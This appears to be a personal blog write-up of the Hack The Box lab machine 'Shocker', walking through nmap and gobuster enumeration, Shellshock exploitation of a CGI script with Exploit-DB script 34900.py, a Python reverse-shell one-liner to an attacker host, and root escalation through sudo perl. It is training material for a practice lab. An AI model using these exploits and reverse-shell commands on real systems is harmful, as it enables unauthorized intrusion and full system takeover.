---
title: Hack The Box - Shocker (Without Metasploit)
date: 2021-01-09 18:19:00 +0800
categories: [hackthebox]
tags: [linux, shellshock, gtfobins]
---

![](/assets/images/shocker.png){:height="414px" width="615px"}

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.56 shocker.htb" | sudo tee -a /etc/hosts
```

# Reconnaissance

```bash
$ nmap -sT -sV -sC -Pn shocker.htb
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-08 14:49 EST
Nmap scan report for shocker (10.10.10.56)
Host is up (0.0062s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.29 seconds

```

# Enumeration (1)

## Port 80 `Apache httpd 2.4.18 ((Ubuntu))`

![](/assets/images/shocker1.png)

Visting the index page only showed this picture and nothing else. This called for some directory brute-forcing.

```bash
$ gobuster dir -k -u http://shocker.htb/ -w /usr/share/wordlists/dirb/common.txt -t 12 -x .txt,.php,.cgi,.sh
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://shocker.htb/
[+] Threads:        12
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php,cgi
[+] Timeout:        10s
===============================================================
2021/01/08 14:51:28 Starting gobuster
===============================================================
...
/cgi-bin/ (Status: 403)
...
===============================================================
2021/01/08 14:51:38 Finished
===============================================================
```

There was `/cgi-bin/` folder, so lets check if there are indeed any `CGI` files in there.

```bash
$ gobuster dir -k -u http://shocker.htb/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -t 20-x .txt,.php,.cgi,.sh
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://shocker.htb/cgi-bin/
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     sh
[+] Timeout:        10s
===============================================================
2021/01/08 15:16:16 Starting gobuster
===============================================================
...
/user.sh (Status: 200)
===============================================================
2021/01/08 15:16:29 Finished
===============================================================
```

There's a `user.sh` file which returns the following content:

```bash
$ curl http://shocker.htb/cgi-bin/user.sh
Content-Type: text/plain

Just an uptime test script

 04:55:43 up 18 min,  0 users,  load average: 0.01, 0.02, 0.00
```

Using `nmap`'s `http-shellshock` script, we can check if it is vulnerable to the `HTTP Shellshock` vulnerability!

```bash
$ nmap -sV -p 80 -Pn --script http-shellshock --script-args uri=/cgi-bin/user.sh shocker.htb
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-09 04:47 EST
Nmap scan report for shocker.htb (10.10.10.56)
Host is up (0.0095s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|_      http://seclists.org/oss-sec/2014/q3/685

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.42 seconds
```

Now that we know it is vulnerable, we can check `searchsploit` if there are any suitable exploits that we can use.

```bash
$ searchsploit apache mod_cgi
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Apache mod_cgi - 'Shellshock' Remote Command Injection     | linux/remote/34900.py
----------------------------------------------------------- ---------------------------------
```

This exploit will allow us to run remote commands so copy it and run it

```bash
$ searchsploit -m 34900      
  Exploit: Apache mod_cgi - 'Shellshock' Remote Command Injection
      URL: https://www.exploit-db.com/exploits/34900
     Path: /usr/share/exploitdb/exploits/linux/remote/34900.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/kali/Desktop/htb/shocker/34900.py
```

# Exploitation (1)

```bash
$ python2 34900.py                                                                     2 ⨯


                Shellshock apache mod_cgi remote exploit

Usage:
./exploit.py var=<value>

Vars:
rhost: victim host
rport: victim port for TCP shell binding
lhost: attacker host for TCP shell reversing
lport: attacker port for TCP shell reversing
pages:  specific cgi vulnerable pages (separated by comma)
proxy: host:port proxy

Payloads:
"reverse" (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport)
"bind" (uses non-bsd netcat) TCP bind shell (Requires: rhost, rport)

Example:

./exploit.py payload=reverse rhost=1.2.3.4 lhost=5.6.7.8 lport=1234
./exploit.py payload=bind rhost=1.2.3.4 rport=1234

Credits:

Federico Galatolo 2014
$ python2 34900.py payload=reverse rhost=10.10.10.56 lhost=10.10.X.X lport=1337 pages=/cgi-bin/user.sh
[!] Started reverse shell handler
[-] Trying exploit on : /cgi-bin/user.sh
[!] Successfully exploited
[!] Incoming connection from 10.10.10.56
10.10.10.56> whoami
shelly
10.10.10.56> id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

We got a shell as `shelly`! But we will need to get a more stable shell so lets start a reverse shell connection with `python3`.

```bash
10.10.10.56> which python3
/usr/bin/python3
10.10.10.56> python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket. SOCK_STREAM);s.connect(("10.10.X.X",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

```bash
$ sudo rlwrap nc -vlnp 9999  
listening on [any] 9999 ...
connect to [10.10.X.X] from (UNKNOWN) [10.10.10.56] 50786
shelly@Shocker:/usr/lib/cgi-bin$
```

# user.txt

The user flag is located in `shelly`'s home directory.

```bash
shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt
5544bb83bed7cc783c10ccb40ac33794
```

# Enumeration (2)

If we check `shelly`'s `sudo` rights,

```bash
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

We see that `shelly` can run the `perl` command as the user `root`. 

# Exploitation (2)


According to [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#sudo), we can run `perl` and then break out of it with just one line

```bash
shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'exec "/bin/sh";'
# id
uid=0(root) gid=0(root) groups=0(root)
```

# root.txt

The root flag is located at `/root` as always.

```bash
# cat root.txt
28edXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```


### Rooted ! Thank you for reading and look forward for more writeups and articles !